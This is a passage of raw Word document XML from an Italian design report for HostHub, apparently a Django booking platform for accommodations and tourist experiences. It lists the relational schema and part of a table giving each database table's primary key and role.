          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>AGENZIA(</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>id_agenzia, nome, partita_iva, email, telefono, indirizzo_sede, descrizione)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F4CAEB7" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Puntoelenco"/>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>CITTA(</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>id_citta, nome, nazione, regione)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7BD7701A" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Puntoelenco"/>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>ALLOGGIO(</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>id_alloggio, titolo, descrizione, indirizzo, prezzo_notte, capienza, tipo_alloggio, numero_camere, numero_letti, numero_bagni, id_host: HOST, id_citta: CITTA)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12F49C8B" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Puntoelenco"/>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>ESPERIENZE(</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>id_esperienza, titolo, descrizione, prezzo, durata, categoria, capienza_massima, luogo, id_agenzia: AGENZIA)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D264727" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Puntoelenco"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>PRENOTAZIONE_</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>ALLOGGIO(</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>id_prenotazione, data_prenotazione, check_in, check_out, numero_ospiti, prezzo_totale, stato, codice_conferma, id_utente: UTENTE, id_alloggio: ALLOGGIO)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50848805" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Puntoelenco"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>PRENOTAZIONE_</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>ESPERIENZE(</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>id_prenotazione_esperienza, data_prenotazione, data_esperienza, numero_partecipanti, prezzo_totale, stato, id_utente: UTENTE, id_esperienza: ESPERIENZE)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07631464" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRPr="00E603E1" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Puntoelenco"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>RECENSIONE_</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>ALLOGGIO(</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">id_recensione, voto, commento, data_recensione, id_prenotazione: </w:t>
      </w:r>
      <w:r w:rsidRPr="00E603E1">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>PRENOTAZIONE_ALLOGGIO)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F11FB5E" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Puntoelenco"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>RECENSIONE_</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>ESPERIENZE(</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>id_recensione_esperienza, voto, commento, data_recensione, id_prenotazione_esperienza: PRENOTAZIONE_ESPERIENZE)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6FE54A71" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Puntoelenco"/>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>SERVIZIO(</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>id_servizio, nome, descrizione, categoria)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A65D6A6" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Puntoelenco"/>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>OFFRE(</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>id_alloggio: ALLOGGIO, id_servizio: SERVIZIO)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3FE8730D" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Puntoelenco"/>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>BADGE(</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>id_badge, nome, descrizione)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53927DE8" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Puntoelenco"/>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>OTTIENE(</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>id_host: HOST, id_badge: BADGE, data_ottenimento)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35F5125C" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Puntoelenco"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>PUNTI_</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>INTERESSE(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>id_punto_interesse</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>nome</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>descrizione</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>categoria</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>, id_citta: CITTA)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15CE2E8A" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Titolo1"/>
      </w:pPr>
      <w:r>
        <w:t>8. Struttura delle tabelle</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21DC12D1" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
      <w:r>
        <w:t>La seguente tabella riassume le tabelle principali del database, indicando il ruolo di ciascuna all’interno dello schema. Le tabelle tecniche di Django, come auth_user, auth_group, django_session e django_migrations, sono presenti nel database ma non rappresentano direttamente entità del dominio HostHub.</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="Grigliatabella"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:jc w:val="center"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="2304"/>
        <w:gridCol w:w="2592"/>
        <w:gridCol w:w="4464"/>
      </w:tblGrid>
      <w:tr w:rsidR="00597ADF" w14:paraId="0BCD8172" w14:textId="77777777">
        <w:trPr>
          <w:jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2304" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="D9EAF7"/>
          </w:tcPr>
          <w:p w14:paraId="12CA95A0" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
            <w:pPr>
              <w:spacing w:after="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Tabella</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2592" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="D9EAF7"/>
          </w:tcPr>
          <w:p w14:paraId="00DAC95C" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
            <w:pPr>
              <w:spacing w:after="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Chiave principale</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4464" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="D9EAF7"/>
          </w:tcPr>
          <w:p w14:paraId="646B84AB" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
            <w:pPr>
              <w:spacing w:after="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Funzione</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00597ADF" w14:paraId="67FFB97E" w14:textId="77777777">
        <w:trPr>
          <w:jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2304" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="65EBB1E0" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
            <w:pPr>
              <w:spacing w:after="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>utente</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2592" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="1E13D8CF" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
            <w:pPr>
              <w:spacing w:after="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>id_utente</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4464" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="7A714F64" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
            <w:pPr>
              <w:spacing w:after="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Dati generali degli utenti registrati.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00597ADF" w14:paraId="4E4238CE" w14:textId="77777777">
        <w:trPr>
          <w:jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2304" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="587C14E0" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
            <w:pPr>
              <w:spacing w:after="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>host</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2592" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="2B39CA1D" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
            <w:pPr>
              <w:spacing w:after="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>id_host</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4464" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="630B9439" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
            <w:pPr>
              <w:spacing w:after="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Specializzazione dell’utente che può gestire alloggi.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00597ADF" w14:paraId="387E4C11" w14:textId="77777777">
        <w:trPr>
          <w:jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2304" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="5D8A1877" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
            <w:pPr>
              <w:spacing w:after="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>alloggio</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2592" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="15D98113" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
            <w:pPr>
              <w:spacing w:after="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>id_alloggio</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4464" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="54396255" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
            <w:pPr>
              <w:spacing w:after="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Immobili pubblicati dagli host.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00597ADF" w14:paraId="2B472E9A" w14:textId="77777777">
        <w:trPr>
          <w:jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2304" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="6039054F" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
            <w:pPr>
              <w:spacing w:after="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>agenzia</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2592" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="068D9F70" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
            <w:pPr>
              <w:spacing w:after="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>id_agenzia</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4464" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="022A4935" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
            <w:pPr>
              <w:spacing w:after="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Soggetti che propongono esperienze turistiche.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00597ADF" w14:paraId="215F48C9" w14:textId="77777777">
        <w:trPr>
          <w:jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2304" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="64D39433" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
            <w:pPr>
              <w:spacing w:after="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>esperienze</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2592" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="23E95999" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
            <w:pPr>
              <w:spacing w:after="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>id_esperienza</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4464" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="4A1EF9BB" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
            <w:pPr>
              <w:spacing w:after="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Attività prenotabili dagli utenti.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00597ADF" w14:paraId="217D934F" w14:textId="77777777">
        <w:trPr>
          <w:jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2304" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="5F78164B" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
            <w:pPr>
              <w:spacing w:after="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>prenotazione_alloggio</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2592" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="1CFC1BD5" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
            <w:pPr>
              <w:spacing w:after="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>id_prenotazione</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4464" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="0EC47307" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
            <w:pPr>
              <w:spacing w:after="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Prenotazioni relative agli alloggi.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00597ADF" w14:paraId="134C854C" w14:textId="77777777">
        <w:trPr>
          <w:jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2304" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="69890747" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
            <w:pPr>
              <w:spacing w:after="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>prenotazione_esperienze</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2592" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="48E916DE" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
            <w:pPr>
              <w:spacing w:after="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>id_prenotazione_esperienza</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4464" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="311F27F4" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
            <w:pPr>
              <w:spacing w:after="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Prenotazioni relative alle esperienze.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00597ADF" w14:paraId="0F2BFD49" w14:textId="77777777">
        <w:trPr>
          <w:jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2304" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="79A27D49" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
            <w:pPr>
              <w:spacing w:after="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>recensione_alloggio</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2592" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="69AD6110" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
            <w:pPr>
              <w:spacing w:after="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>id_recensione</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4464" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="3B719348" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
            <w:pPr>
              <w:spacing w:after="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Recensioni collegate alle prenotazioni degli alloggi.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00597ADF" w14:paraId="461BED5B" w14:textId="77777777">
        <w:trPr>
          <w:jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2304" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="25A0A1FA" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
            <w:pPr>
              <w:spacing w:after="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>recensione_esperienze</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2592" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="1E72C01A" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
            <w:pPr>
              <w:spacing w:after="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>id_recensione_esperienza</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4464" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="3340557A" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
            <w:pPr>
              <w:spacing w:after="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Recensioni collegate alle prenotazioni delle esperienze.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00597ADF" w14:paraId="6B4391CA" w14:textId="77777777">
        <w:trPr>
          <w:jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2304" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="386D9333" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
            <w:pPr>
              <w:spacing w:after="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>servizio</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
